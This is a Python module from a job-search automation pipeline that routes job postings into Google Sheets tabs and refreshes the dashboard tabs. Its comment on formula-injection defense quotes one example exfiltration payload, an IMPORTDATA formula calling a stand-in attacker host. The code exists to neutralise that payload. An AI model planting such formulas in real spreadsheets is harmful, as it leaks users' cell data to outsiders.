"""
description: Route v2 NormalizedJobs into per-role destination tabs (PM, AI PM, AI Automation,
    AI Mobile, AI Process, AI Consultant) using a column-by-NAME writer that survives
    arbitrary column reorderings in the live sheet. Also refreshes the Top Matches and
    Summary dashboards on every run.
inputs:
    - list[NormalizedJob] (filtered, ranked)
    - env: SHEETS_SPREADSHEET_ID, GOOGLE_SERVICE_ACCOUNT_PATH (default credentials/service_account.json)
    - config: tab_routing section of config/job_search_v2.json
outputs:
    - New rows appended to each per-role tab (column-by-name, dedup'd against existing _id)
    - Top Matches tab fully refreshed with the current run's best tier-A/B jobs
    - Summary tab fully refreshed with this run's pipeline stats + per-tab totals
    - Returns (rows_appended, per_tab_counts, ok)

Why a name-based writer: gspread.append_rows is positional. If the destination sheet's
"data range" ever drifts (operator inserts a column, header gets renamed, etc.) the writer
silently misaligns every value forever. Exhibit: pre-2026-06-23 the PM tab data was shifted
one column right because the Sheets API table-range had captured an empty leading column.
"""

from __future__ import annotations

import logging
import os
import sys
from datetime import datetime, timezone
from pathlib import Path

from dotenv import load_dotenv, find_dotenv

_PKG_DIR = Path(__file__).resolve().parent.parent
if str(_PKG_DIR.parent.parent.parent.parent) not in sys.path:
    sys.path.insert(0, str(_PKG_DIR.parent.parent.parent.parent))

from execution.personal_workflows.job_search_v2.contracts import (  # noqa: E402
    NormalizedJob,
    RankedJob,
)

load_dotenv(find_dotenv(usecwd=False))
logger = logging.getLogger("notifier.sheet")

# Canonical header set for per-role tabs. Trimmed 2026-06-24 per operator request:
# dropped _id / First Seen / Posted / Remote? / Source / Also Seen On / Status /
# Notes / Tier — cross-day dedup is handled by seen.db at the pipeline level, so
# the in-sheet _id column is no longer load-bearing for correctness.
STANDARD_HEADERS = [
    "Company", "Title", "Country", "Location", "Contract", "Link",
]


# ---------------------------------------------------------------------------
# FORMULA-INJECTION DEFENSE (2026-07-01 security audit).
#
# Google Sheets evaluates any cell whose value starts with `=`, `+`, `-`, `@`
# as a formula when `value_input_option="USER_ENTERED"`. Job titles / company
# names / URLs from external sources are UNTRUSTED — a malicious posting
# titled `=IMPORTDATA("attacker.com/steal?d="&A1)` would exfiltrate adjacent
# cell data through Google's infrastructure.
#
# Defense: prefix any leading `=/+/-/@` with a single quote — Sheets treats
# that as a text-literal marker (the apostrophe is NOT stored in the cell,
# it just disables formula parsing for that cell). We keep USER_ENTERED
# so URLs stay auto-hyperlinked and dates parse correctly.
_FORMULA_TRIGGER_CHARS = ("=", "+", "-", "@")


def _defuse_formula(value: str) -> str:
    """If value starts with a Sheets formula-trigger char, prefix with '.
    Cheap; safe; preserves auto-hyperlinking and date parsing on legit values."""
    if value and value[0] in _FORMULA_TRIGGER_CHARS:
        return "'" + value
    return value

# Top Matches dashboard schema. Trimmed 2026-06-24 per operator request: dropped
# Rank (row order already conveys it) / Identity (Title + Company is already in
# the next two cols) / Why (Sonnet reasoning is in the sheet's role tabs).
TOP_MATCHES_HEADERS = [
    "Fit", "Title", "Company", "Location", "Contract", "Source Tab", "Link",
]
TOP_MATCHES_TAB = "Top Matches"
SUMMARY_TAB = "Summary"
TOP_MATCHES_MAX = 25


def route_to_tab(title: str, routing_config: dict) -> str:
    """Map a job title to a destination tab via title synonyms.

    Strategy: longest synonym wins. This way 'ai product manager' (more specific)
    beats 'product manager' (catchall) when both would match the same title.
    """
    title_lower = title.lower().strip()
    titles_cfg = routing_config.get("titles", {})

    all_synonyms: list[tuple[str, str]] = []
    for key, cfg in titles_cfg.items():
        tab = cfg.get("tab", key)
        for syn in cfg.get("synonyms", []):
            all_synonyms.append((syn.lower(), tab))
    all_synonyms.sort(key=lambda t: -len(t[0]))

    for syn, tab in all_synonyms:
        if syn in title_lower:
            return tab
    return routing_config.get("fallback_tab", "PM")


def _job_to_dict(job: NormalizedJob, ranked: RankedJob | None, run_now: str) -> dict[str, str]:
    """Build a {header_name: value} dict so the writer can place each value by name."""
    posted = job.posted_at.isoformat()[:10] if job.posted_at else ""
    also_seen = ", ".join(s.value for s in job.also_seen_on) if job.also_seen_on else ""
    tier = ranked.tier.value if ranked else ""
    return {
        "_id": job.content_hash[:16],
        "First Seen": run_now[:10],
        "Posted": posted,
        "Company": job.company,
        "Title": job.title,
        "Country": "",
        "Location": job.location,
        "Remote?": job.remote_mode.value,
        "Contract": job.contract_type.value,
        "Source": job.source.value,
        "Also Seen On": also_seen,
        "Link": str(job.url),
        "Status": "New",
        "Notes": ranked.reasoning if ranked else "",
        "Tier": tier,
    }


def _col_index_to_letter(idx: int) -> str:
    """1-based column index → A1 letter (1→A, 27→AA)."""
    s = ""
    while idx > 0:
        idx, r = divmod(idx - 1, 26)
        s = chr(65 + r) + s
    return s


def _read_header_map(ws) -> dict[str, int]:
    """Return {header_name: 1-based-col-index} for non-empty header cells in row 1."""
    header = ws.row_values(1)
    return {name: idx + 1 for idx, name in enumerate(header) if name and name.strip()}


def _next_empty_row(ws) -> int:
    """First fully-empty row index after the last row containing any data."""
    all_vals = ws.get_all_values()
    return len(all_vals) + 1


def _existing_ids(ws, id_col_1based: int) -> set[str]:
    """Return the set of _id values already in the tab (skipping the header)."""
    vals = ws.col_values(id_col_1based)
    return {v.strip() for v in vals[1:] if v and v.strip()}


def _ensure_headers(ws, expected: list[str]) -> dict[str, int]:
    """Make sure every expected header is present in row 1. Add any that are missing
    at the next free column. Returns the header→col map.
    """
    header_map = _read_header_map(ws)
    missing = [h for h in expected if h not in header_map]
    if not missing:
        return header_map

    start_col = (max(header_map.values()) if header_map else 0) + 1
    # Expand the worksheet if needed.
    needed_cols = start_col + len(missing) - 1
    if ws.col_count < needed_cols:
        try:
            ws.resize(rows=ws.row_count, cols=needed_cols)
        except Exception as exc:  # noqa: BLE001 — quota-time resize may fail; log + continue
            logger.warning("notifier.sheet: resize %s failed: %s", ws.title, exc)

    end_col_letter = _col_index_to_letter(needed_cols)
    start_col_letter = _col_index_to_letter(start_col)
    ws.update(
        range_name=f"{start_col_letter}1:{end_col_letter}1",
        values=[missing],
        value_input_option="USER_ENTERED",
    )
    logger.info("notifier.sheet: added missing headers to %s: %s", ws.title, missing)
    return _read_header_map(ws)


def _append_dicts(ws, dicts: list[dict[str, str]], dedup_id_field: str = "_id") -> int:
    """Append rows by column-name mapping. Returns count actually written.

    Behavior:
      - Reads the existing header row.
      - For each dict, builds a row by header position, leaving unknown columns blank.
      - Dedups against existing values in the dedup_id_field column.
      - Uses explicit A:Z range write rather than append_rows so phantom columns can't
        shift data.
    """
    if not dicts:
        return 0

    header_map = _ensure_headers(ws, STANDARD_HEADERS)
    id_col = header_map.get(dedup_id_field)
    if id_col is None:
        logger.warning("notifier.sheet: tab %s has no %s column — appending without dedup", ws.title, dedup_id_field)
        existing_ids: set[str] = set()
    else:
        existing_ids = _existing_ids(ws, id_col)

    fresh = [d for d in dicts if d.get(dedup_id_field, "").strip() not in existing_ids]
    if not fresh:
        logger.info("notifier.sheet: %s — all %d candidates already present, 0 written", ws.title, len(dicts))
        return 0

    max_col = max(header_map.values())
    rows: list[list[str]] = []
    for d in fresh:
        row = [""] * max_col
        for header_name, col_1based in header_map.items():
            if header_name in d:
                # Defuse formula-injection before writing: external job titles
                # like "=IMPORTDATA(...)" must be stored as text literals.
                row[col_1based - 1] = _defuse_formula(str(d[header_name]))
        rows.append(row)

    start_row = _next_empty_row(ws)
    end_row = start_row + len(rows) - 1
    end_col_letter = _col_index_to_letter(max_col)
    range_str = f"A{start_row}:{end_col_letter}{end_row}"

    # Resize rows if needed.
    if ws.row_count < end_row:
        try:
            ws.resize(rows=end_row + 100, cols=ws.col_count)
        except Exception as exc:  # noqa: BLE001 — quota-time resize may fail; log + continue
            logger.warning("notifier.sheet: row-resize %s failed: %s", ws.title, exc)

    ws.update(range_name=range_str, values=rows, value_input_option="USER_ENTERED")
    logger.info("notifier.sheet: appended %d rows to %s at %s", len(rows), ws.title, range_str)
    return len(rows)


def _open_sheet(spreadsheet_id: str | None, service_account_path: Path | None):
    """Authenticate and return the gspread Spreadsheet, or (None, reason) on failure."""
    spreadsheet_id = spreadsheet_id or os.environ.get("SHEETS_SPREADSHEET_ID", "").strip()
    sa_path = service_account_path or Path(
        os.environ.get("GOOGLE_SERVICE_ACCOUNT_PATH", "credentials/service_account.json")
    )

    if not spreadsheet_id:
        return None, "SHEETS_SPREADSHEET_ID missing"

    try:
        import gspread  # type: ignore
        from google.oauth2.service_account import Credentials  # type: ignore
    except ImportError as exc:
        return None, f"gspread / google-auth not installed ({exc})"

    if not sa_path.exists():
        return None, f"service account JSON not found at {sa_path}"

    try:
        creds = Credentials.from_service_account_file(
            str(sa_path),
            scopes=["https://www.googleapis.com/auth/spreadsheets"],
        )
        client = gspread.authorize(creds)
        return client.open_by_key(spreadsheet_id), None
    except Exception as exc:  # noqa: BLE001 — auth or open failure
        return None, f"setup failed: {exc}"


def append_jobs(
    jobs: list[NormalizedJob],
    *,
    ranked_by_hash: dict[str, RankedJob] | None = None,
    routing_config: dict | None = None,
    spreadsheet_id: str | None = None,
    service_account_path: Path | None = None,
    dry_run: bool = False,
) -> tuple[int, dict[str, int], bool]:
    """Append jobs to their routed tabs by COLUMN NAME (not position).

    Returns (total_rows_written, per_tab_counts, ok).

    Failure modes — all soft-fail:
      - missing creds / spreadsheet_id → log + return (0, {}, False).
      - per-tab failure → log + skip that tab; other tabs still attempt.
    """
    if not jobs:
        logger.info("notifier.sheet: 0 jobs to append, skipping")
        return 0, {}, True

    routing_config = routing_config or {"fallback_tab": "PM", "titles": {}}
    ranked_by_hash = ranked_by_hash or {}
    now_iso = datetime.now(timezone.utc).isoformat()

    per_tab: dict[str, list[dict[str, str]]] = {}
    for job in jobs:
        tab = route_to_tab(job.title, routing_config)
        ranked = ranked_by_hash.get(job.content_hash)
        per_tab.setdefault(tab, []).append(_job_to_dict(job, ranked, now_iso))

    per_tab_counts = {tab: len(rows) for tab, rows in per_tab.items()}

    if dry_run:
        logger.info("notifier.sheet [dry-run]: would consider %s", per_tab_counts)
        return sum(per_tab_counts.values()), per_tab_counts, True

    sp, err = _open_sheet(spreadsheet_id, service_account_path)
    if sp is None:
        logger.warning("notifier.sheet: %s — skipping append", err)
        return 0, {}, False

    import gspread  # type: ignore

    total_written = 0
    written_per_tab: dict[str, int] = {}
    ok = True
    for tab, dicts in per_tab.items():
        try:
            try:
                ws = sp.worksheet(tab)
            except gspread.WorksheetNotFound:
                ws = sp.add_worksheet(title=tab, rows="1000", cols=str(len(STANDARD_HEADERS)))
                ws.update(
                    range_name=f"A1:{_col_index_to_letter(len(STANDARD_HEADERS))}1",
                    values=[STANDARD_HEADERS],
                    value_input_option="USER_ENTERED",
                )
                logger.info("notifier.sheet: created missing tab %s with canonical headers", tab)

            written = _append_dicts(ws, dicts)
            total_written += written
            written_per_tab[tab] = written
        except Exception as exc:  # noqa: BLE001 — gspread surface; log + continue with other tabs
            logger.error("notifier.sheet: append to %s failed: %s", tab, exc, exc_info=True)
            written_per_tab[tab] = 0
            ok = False

    return total_written, written_per_tab, ok


# ----- Top Matches dashboard -----


def refresh_top_matches(
    jobs: list[NormalizedJob],
    *,
    ranked_by_hash: dict[str, RankedJob],
    routing_config: dict | None = None,
    spreadsheet_id: str | None = None,
    service_account_path: Path | None = None,
    dry_run: bool = False,
    top_n: int = TOP_MATCHES_MAX,
) -> tuple[int, bool]:
    """Fully refresh the Top Matches tab with the best jobs from this run.

    Selection: take the top-n jobs sorted by ranker.score desc (ties broken by tier A>B>C).
    Skip jobs with tier=SKIP. Writes Rank / Fit / Identity / Title / Company / Location /
    Contract / Source Tab / Why / Link.

    Returns (rows_written, ok).
    """
    routing_config = routing_config or {"fallback_tab": "PM", "titles": {}}

    tier_priority = {"A": 0, "B": 1, "C": 2, "SKIP": 3}
    candidates = []
    for job in jobs:
        ranked = ranked_by_hash.get(job.content_hash)
        if ranked is None or ranked.tier.value == "SKIP":
            continue
        candidates.append((job, ranked))

    candidates.sort(key=lambda jr: (tier_priority.get(jr[1].tier.value, 9), -jr[1].score))
    top = candidates[:top_n]

    if dry_run:
        logger.info("notifier.sheet [dry-run]: would refresh Top Matches with %d rows", len(top))
        return len(top), True

    sp, err = _open_sheet(spreadsheet_id, service_account_path)
    if sp is None:
        logger.warning("notifier.sheet: Top Matches skipped — %s", err)
        return 0, False

    import gspread  # type: ignore
    try:
        try:
            ws = sp.worksheet(TOP_MATCHES_TAB)
        except gspread.WorksheetNotFound:
            ws = sp.add_worksheet(title=TOP_MATCHES_TAB, rows="100", cols=str(len(TOP_MATCHES_HEADERS)))

        # Ensure header in row 1 matches our expected dashboard schema.
        header_map = _read_header_map(ws)
        if not header_map:
            ws.update(
                range_name=f"A1:{_col_index_to_letter(len(TOP_MATCHES_HEADERS))}1",
                values=[TOP_MATCHES_HEADERS],
                value_input_option="USER_ENTERED",
            )
            header_map = _read_header_map(ws)

        # Clear everything below the header.
        end_col_letter = _col_index_to_letter(max(header_map.values()))
        clear_range = f"A2:{end_col_letter}{max(ws.row_count, top_n + 5)}"
        try:
            ws.batch_clear([clear_range])
        except Exception as exc:  # noqa: BLE001 — pre-clear is best-effort
            logger.warning("notifier.sheet: clear Top Matches body failed: %s", exc)

        if not top:
            logger.info("notifier.sheet: Top Matches refreshed — 0 candidates")
            return 0, True

        max_col = max(header_map.values())
        rows: list[list[str]] = []
        for rank, (job, ranked) in enumerate(top, start=1):
            tab = route_to_tab(job.title, routing_config)
            payload = {
                "Rank": str(rank),
                "Fit": ranked.tier.value,
                "Identity": f"{job.title} @ {job.company}",
                "Title": job.title,
                "Company": job.company,
                "Location": job.location,
                "Contract": job.contract_type.value,
                "Source Tab": tab,
                "Why": ranked.reasoning,
                "Link": str(job.url),
            }
            row = [""] * max_col
            for name, col in header_map.items():
                if name in payload:
                    # Defuse formula injection on the Top Matches payload too:
                    # ranker.reasoning is LLM-generated text and could start
                    # with `=` if the model quotes a formula-looking snippet.
                    row[col - 1] = _defuse_formula(payload[name])
            rows.append(row)

        end_row = 1 + len(rows)
        range_str = f"A2:{end_col_letter}{end_row}"
        if ws.row_count < end_row:
            try:
                ws.resize(rows=end_row + 20, cols=ws.col_count)
            except Exception as exc:  # noqa: BLE001 — quota-time resize may fail; log + continue
                logger.warning("notifier.sheet: row-resize Top Matches failed: %s", exc)

        ws.update(range_name=range_str, values=rows, value_input_option="USER_ENTERED")
        logger.info("notifier.sheet: refreshed Top Matches with %d rows", len(rows))
        return len(rows), True
    except Exception as exc:  # noqa: BLE001 — sheet surface; log + return ok=False
        logger.error("notifier.sheet: refresh_top_matches failed: %s", exc, exc_info=True)
        return 0, False


# ----- Summary dashboard -----


def refresh_summary(
    pipeline_stats: dict,
    *,
    per_tab_totals: dict[str, int] | None = None,
    spreadsheet_id: str | None = None,
    service_account_path: Path | None = None,
    dry_run: bool = False,
) -> bool:
    """Fully refresh the Summary tab with this run's pipeline stats.

    Layout written into the Summary tab:
        A1:      JOB SEARCH DASHBOARD
        A3:      Last Updated  |  B3: <iso datetime>
        A5:      METRIC        |  B5: VALUE          (header row)
        A6..    Per-source fetched, normalized, new, location-kept, ranker by tier,
                per-tab added today, sheet append status.

    Returns ok.
    """
    if dry_run:
        logger.info("notifier.sheet [dry-run]: would refresh Summary")
        return True

    sp, err = _open_sheet(spreadsheet_id, service_account_path)
    if sp is None:
        logger.warning("notifier.sheet: Summary skipped — %s", err)
        return False

    import gspread  # type: ignore
    try:
        try:
            ws = sp.worksheet(SUMMARY_TAB)
        except gspread.WorksheetNotFound:
            ws = sp.add_worksheet(title=SUMMARY_TAB, rows="100", cols="6")

        # Clear everything below row 1 (we keep the dashboard title in A1).
        try:
            ws.batch_clear([f"A2:F{max(ws.row_count, 60)}"])
        except Exception as exc:  # noqa: BLE001 — pre-clear is best-effort
            logger.warning("notifier.sheet: clear Summary body failed: %s", exc)

        ranker = pipeline_stats.get("ranker", {}) or {}
        by_tier = ranker.get("by_tier", {}) or {}
        per_source = pipeline_stats.get("per_source", {}) or {}
        sheet_per_tab = pipeline_stats.get("sheet_per_tab", {}) or {}

        now = datetime.now(timezone.utc)
        friendly_time = now.strftime("%A %d %B %Y, %H:%M UTC")

        rows: list[list[str]] = []

        def add(metric: str, value=""):
            # Defuse: metric labels are developer-controlled but 'value' may
            # come from stat dicts that eventually include external strings.
            rows.append([_defuse_formula(metric), _defuse_formula(str(value))])

        # ---- Health score (computed, rendered in PLAIN ENGLISH) ----
        grade, score_str, plain_status, issues = "?", "", "", []
        try:
            from execution.personal_workflows.job_search_v2.notifier.health_score import (
                calculate_health,
            )
            health = calculate_health(pipeline_stats, per_tab_totals=per_tab_totals)
            score = health["overall_score"]
            score_str = f"{score:.0f}/100"
            if score >= 80:
                grade = "GOOD"
            elif score >= 60:
                grade = "OK"
            elif score >= 40:
                grade = "NEEDS ATTENTION"
            else:
                grade = "POOR"
            # Translate failing dimensions into plain-English issues.
            human = {
                "match_quality": "Low share of strong matches among relevant jobs",
                "strong_volume": "Fewer than 5 strong (A/B) matches surfaced today",
                "relevance_guard": "The relevance/language gate did not run properly",
                "coverage": "Too few job sources contributed",
                "freshness": "Data is stale (cron may not have run)",
                "delivery": "A write step (sheet/email) failed",
            }
            for d in health["dimensions"]:
                if d["status"] == "FAIL":
                    issues.append(human.get(d["name"], d["name"]))
            plain_status = (
                f"Confidence: {health['confidence'].title()}. "
                + ("Everything looks healthy." if not issues else "See issues below.")
            )
        except Exception as exc:  # noqa: BLE001 — non-critical
            logger.warning("notifier.sheet: health score render failed: %s", exc)

        # ============ HUMAN-READABLE DASHBOARD ============
        add(f"STATUS: {grade}", f"Health {score_str}")
        add("Last updated", friendly_time)
        if plain_status:
            add("", plain_status)
        # Acceptance gate + reliability streak (measured, not claimed). The
        # acceptance verdict is computed AFTER this summary is written (run.py
        # Stage 5b > Stage 4c), so read the persisted streak file for the
        # last-known value rather than in-run stats.
        try:
            import json as _json
            from pathlib import Path as _Path
            streak_file = _Path(__file__).resolve().parents[4] / ".tmp" / "job_search_v2" / "acceptance_streak.json"
            if streak_file.exists():
                st = _json.loads(streak_file.read_text(encoding="utf-8"))
                n = int(st.get("consecutive_pass", 0))
                add("Output check (last run)", f"{st.get('last_verdict','?')} — {n}/5 consecutive clean"
                    + (" (SHIPPABLE)" if st.get("shippable") else " (not yet shippable)"))
        except Exception as exc:  # noqa: BLE001 — non-critical display line
            logger.warning("notifier.sheet: streak read failed: %s", exc)
        rows.append(["", ""])

        # --- Today's results ---
        new_jobs = pipeline_stats.get("after_dedup_new", 0)
        added_today = sum(sheet_per_tab.values()) if sheet_per_tab else 0
        strong = by_tier.get("A", 0) + by_tier.get("B", 0)
        rows.append(["TODAY", ""])
        add("New jobs seen (before filtering)", new_jobs)
        add("Relevant jobs added to your sheet", added_today)
        add("Strong matches (A/B) -> see 'Top Matches' tab", strong)
        if sheet_per_tab:
            by_tab_str = ", ".join(f"{t}: {n}" for t, n in sheet_per_tab.items() if n)
            add("Where they went", by_tab_str or "(none)")
        rows.append(["", ""])

        # --- What we filtered out, in plain words (so you trust what's left) ---
        rows.append(["FILTERED OUT (and why)", ""])
        title_f = pipeline_stats.get("title_filter", {}) or {}
        lang_f = pipeline_stats.get("language_filter", {}) or {}
        contract_f = pipeline_stats.get("contract_filter", {}) or {}
        tf_reasons = title_f.get("by_reason", {}) or {}
        not_relevant = tf_reasons.get("not_relevant", 0)
        proj = tf_reasons.get("project_manager", 0)
        intern = tf_reasons.get("internship_or_alternance", 0) + tf_reasons.get("junior_or_graduate", 0)
        wrong_lang = lang_f.get("rejected", 0)
        wrong_loc = pipeline_stats.get("location_rejected", 0)
        no_contract = (contract_f.get("by_reason", {}) or {}).get("unknown_from_fr_source", 0)
        add("Wrong role (not PM / AI / automation)", not_relevant)
        add("Project manager (different job)", proj)
        add("Internship / junior / alternance", intern)
        add("Wrong language (not EN / FR)", wrong_lang)
        add("Outside target locations", wrong_loc)
        if no_contract:
            add("Missing contract info (FR sources)", no_contract)
        rows.append(["", ""])

        # --- Sources working today ---
        rows.append(["SOURCES TODAY", ""])
        live_sources = [s for s, n in per_source.items() if n > 0]
        add("Working", ", ".join(sorted(live_sources)) or "(none)")
        quiet = [s for s, n in per_source.items() if n == 0]
        if quiet:
            add("Quiet (0 results)", ", ".join(sorted(quiet)))
        rows.append(["", ""])

        # --- Issues needing your attention (only if any) ---
        if issues:
            rows.append(["NEEDS YOUR ATTENTION", ""])
            for i in issues:
                add("- " + i)
            rows.append(["", ""])

        # --- Your sheet totals ---
        if per_tab_totals:
            rows.append(["YOUR SHEET (all-time)", ""])
            for tab_name, n in per_tab_totals.items():
                add(tab_name, n)
            rows.append(["", ""])

        # --- Compact technical footer (collapsed at the bottom, for debugging) ---
        rows.append(["--- technical details (for debugging) ---", ""])
        add("Run ID", pipeline_stats.get("run_id", ""))
        add("Total fetched -> normalized -> new",
            f"{pipeline_stats.get('total_fetched', 0)} -> {pipeline_stats.get('after_normalize', 0)} -> {new_jobs}")
        add("Ranker tiers A/B/C/SKIP",
            f"{by_tier.get('A',0)}/{by_tier.get('B',0)}/{by_tier.get('C',0)}/{by_tier.get('SKIP',0)}")
        add("Ranker mode", "LLM" if ranker.get("scored", 0) > 0 else "heuristic fallback")
        add("Email", "sent" if pipeline_stats.get("email_sent") else str(pipeline_stats.get("email_lock", "not sent")))

        end_row = 1 + len(rows)
        if ws.row_count < end_row:
            try:
                ws.resize(rows=end_row + 20, cols=max(ws.col_count, 2))
            except Exception as exc:  # noqa: BLE001 — quota-time resize may fail; log + continue
                logger.warning("notifier.sheet: row-resize Summary failed: %s", exc)

        # Header row 1 — overwrite ONLY A1:B1 (C1/D1/F1 hold email-lock + GEMINI
        # fallback state and must not be clobbered).
        ws.update(range_name="A1:B1", values=[["JOB SEARCH — DAILY SUMMARY", ""]], value_input_option="USER_ENTERED")
        ws.update(
            range_name=f"A2:B{1 + len(rows)}",
            values=rows,
            value_input_option="USER_ENTERED",
        )
        logger.info("notifier.sheet: refreshed Summary with %d rows", len(rows))
        return True
    except Exception as exc:  # noqa: BLE001 — sheet surface; log + return False
        logger.error("notifier.sheet: refresh_summary failed: %s", exc, exc_info=True)
        return False


def count_existing_rows(
    tabs: list[str],
    *,
    spreadsheet_id: str | None = None,
    service_account_path: Path | None = None,
) -> dict[str, int]:
    """Return {tab_name: row_count_excluding_header} for the given tabs.

    Used by run.py to feed all-time totals into the Summary dashboard. Best-effort:
    a tab that doesn't exist returns 0.
    """
    sp, err = _open_sheet(spreadsheet_id, service_account_path)
    if sp is None:
        logger.warning("notifier.sheet: count_existing_rows skipped — %s", err)
        return {t: 0 for t in tabs}

    import gspread  # type: ignore
    out: dict[str, int] = {}
    for t in tabs:
        try:
            ws = sp.worksheet(t)
            ids = [v for v in ws.col_values(1)[1:] if v and v.strip()]
            out[t] = len(ids)
        except gspread.WorksheetNotFound:
            out[t] = 0
        except Exception as exc:  # noqa: BLE001 — sheet surface; log + continue
            logger.warning("notifier.sheet: count_existing_rows %s failed: %s", t, exc)
            out[t] = 0
    return out
